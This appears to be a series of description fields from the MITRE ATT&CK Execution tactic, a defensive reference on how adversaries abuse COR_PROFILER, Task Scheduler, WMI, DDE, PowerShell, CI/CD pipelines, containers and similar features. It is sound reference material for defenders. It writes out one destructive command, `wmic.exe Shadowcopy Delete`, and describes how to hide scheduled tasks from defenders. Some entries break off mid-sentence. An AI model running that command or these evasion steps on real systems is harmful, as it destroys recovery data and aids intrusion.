        Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

        The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

        Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)

      description: "Adversaries may abuse the Windows Task Scheduler to perform task
        scheduling for initial or recurring execution of malicious code. There are
        multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
        utility can be run directly on the command line, or the Task Scheduler can
        be opened through the GUI within the Administrator Tools section of the Control
        Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
        wrapper for the Windows Task Scheduler, and alternatively, adversaries have
        used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
        Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to
        create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red
        Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at
        system startup or on a scheduled basis for persistence. The Windows Task Scheduler
        can also be abused to conduct remote Execution as part of Lateral Movement
        and/or to run a process under the context of a specified account (such as
        SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
        adversaries have also abused the Windows Task Scheduler to potentially mask
        one-time execution under signed/trusted system processes.(Citation: ProofPoint
        Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide
        Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible
        to defender tools and manual queries used to enumerate tasks. Specifically,
        an adversary may hide a task from `schtasks /query` and the Task Scheduler
        by deleting the associated Security Descriptor (SD) registry value (where
        deletion of this value must be completed using SYSTEM permissions).(Citation:
        SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
        methods to hide tasks, such as altering the metadata (e.g., `Index` value)
        within associated registry keys.(Citation: Defending Against Scheduled Task

        Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.

        The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)

        An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)

        **Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)

        Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).

        Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.

        The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)

        The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)

        Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)

        JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)

        JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)

        Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).

        Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.

        In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)

      description: |-
        Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

        Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)

        Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )

        DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)

        Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)

        Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)

      description: |-
        Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)

        Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)

      description: |-
        Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

        Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e "script here"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)

        AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.

        Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)

      description: |-
        Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

        Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.

        Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)

        Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

        Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).

        Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)

        Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)

        These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)

        Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).

        For example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.(Citation: BleepingComputer BackSwap)(Citation: welivesecurity BackSwap)

      description: |-
        Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

        Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)

      description: "Adversaries may manipulate continuous integration / continuous
        development (CI/CD) processes by injecting malicious code into the build process.
        There are several mechanisms for poisoning pipelines: \n\n* In a <b>Direct
        Pipeline Execution</b> scenario, the threat actor directly modifies the CI
        configuration file (e.g., `gitlab-ci.yml` in GitLab). They may include a command
        to exfiltrate credentials leveraged in the build process to a remote server,
        or to export them as a workflow artifact.(Citation: Unit 42 Palo Alto GitHub
        Actions Supply Chain Attack 2025)(Citation: OWASP CICD-SEC-4)\n* In an <b>Indirect
        Pipeline Execution</b> scenario, the threat actor injects malicious code into
        files referenced by the CI configuration file. These may include makefiles,
        scripts, unit tests, and linters.(Citation: OWASP CICD-SEC-4)\n* In a <b>Public
        Pipeline Execution</b> scenario, the threat actor does not have direct access
        to the repository but instead creates a malicious pull request from a fork
        that triggers a part of the CI/CD pipeline. For example, in GitHub Actions,
        the `pull_request_target` trigger allows workflows running from forked repositories
        to access secrets.  If this trigger is combined with an explicit pull request
        checkout and a location for a threat actor to insert malicious code (e.g.,
        an `npm build` command), a threat actor may be able to leak pipeline credentials.(Citation:
        Unit 42 Palo Alto GitHub Actions Supply Chain Attack 2025)(Citation: GitHub
        Security Lab GitHub Actions Security 2021) Similarly, threat actors may craft
        pull requests with malicious inputs (such as branch names) if the build pipeline
        treats those inputs as trusted.(Citation: Wiz Ultralytics AI Library Hijack
        2024)(Citation: Synactiv Hijacking GitHub Runners)(Citation: GitHub Security
        Labs GitHub Actions Security Part 2 2021) Finally, if a pipeline leverages
        a self-hosted runner, a threat actor may be able to execute arbitrary code
        on a host inside the organization’s network.(Citation: John Stawinski PyTorch
        Supply Chain Attack 2024)\n\nBy poisoning CI/CD pipelines, threat actors may
        be able to gain access to credentials, laterally move to additional hosts,
        or input malicious components to be shipped further down the pipeline (i.e.,
        [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)). "

      description: "Adversaries may abuse scripting or built-in command line interpreters

        is the primary means through which users and administrators interact with
        the device in order to view system information, modify device operations,
        or perform diagnostic and administrative functions. CLIs typically contain
        various permission levels required for different commands. \n\nScripting interpreters
        automate tasks and extend functionality beyond the command set included in
        the network OS. The CLI and scripting interpreter are accessible through a
        direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\nAdversaries
        can use the network CLI to change how network devices behave and operate.
        The CLI may be used to manipulate traffic flows to intercept or manipulate
        data, modify startup configuration parameters to load malicious system software,
        or to disable security features or logging to avoid detection.(Citation: Cisco

      description: |-
        Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)

        Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).

      name: User Execution
      description: |-
        An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

        While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

        Adversaries may also deceive users into performing actions such as:

        * Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary
        * Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)
        * Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)
        * Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)

        For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)

        Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

        PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

        A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

        PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)

        Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)

        Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.

        An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence.

        Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

        Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

        Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.

        Some systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.

      description: |-
        Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)

        Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)

      name: Exploitation for Client Execution
      description: |-
        Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

        Several types exist:

        ### Browser-based Exploitation

        Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

        ### Office Applications

        Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

        ### Common Third-party Applications

        Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.

      description: |-
        Adversaries may abuse built-in CLI tools or API calls to execute malicious commands in containerized environments.

        The Docker CLI is used for managing containers via an exposed API point from the `dockerd` daemon. Some common examples of Docker CLI include Docker Desktop CLI and Docker Compose, but users are also able to use SDKs to interact with the API. For example, Docker SDK for Python can be used to run commands within a Python application.(Citation: Docker Desktop CLI)

        Adversaries may leverage the Docker CLI, API, or SDK to pull or build Docker images (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Build Image on Host](https://attack.mitre.org/techniques/T1612)), run containers (i.e., [Deploy Container](https://attack.mitre.org/techniques/T1610)), or execute commands inside running containers (i.e., [Container Administration Command](https://attack.mitre.org/techniques/T1609)). In some cases, threat actors may pull legitimate images that include scripts or tools that they can leverage - for example, using an image that includes the `curl` command to download payloads.(Citation: Intezer) Adversaries may also utilize `docker inspect` and `docker ps` to scan for cloud environment variables and other running containers (i.e., [Container and Resource Discovery](https://attack.mitre.org/techniques/T1613)).(Citation: Cisco Talos Blog)(Citation: aquasec)

        Kubernetes is responsible for the management and orchestration of containers across clusters. The Kubernetes control plane, which manages the state of the cluster and is responsible for scheduling, communication, and resource monitoring, can be invoked directly via the API or indirectly via CLI tools such as `kubectl`. It may also be accessed within client libraries such as Go or Python. By utilizing the API, administrators can interact with resources within the cluster such as listing or creating pods, which is a group of one or more containers. Adversaries call the API server via `curl` or other tools, allowing them to obtain further information about the environment such as pods, deployments, daemonsets, namespaces, or sysvars.(Citation: aquasec) They may also run various commands regarding resource management.

        Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)

        Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.

        Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)

        Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)

        Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )

      name: Serverless Execution
      description: "Adversaries may abuse serverless computing, integration, and automation
        services to execute arbitrary code in cloud environments. Many cloud providers
        offer a variety of serverless resources, including compute engines, application
        integration services, and web servers. \n\nAdversaries may abuse these resources
        in various ways as a means of executing arbitrary commands. For example, adversaries
        may use serverless functions to execute malicious code, such as crypto-mining
        malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation:
        Cado Security Denonia) Adversaries may also create functions that enable further
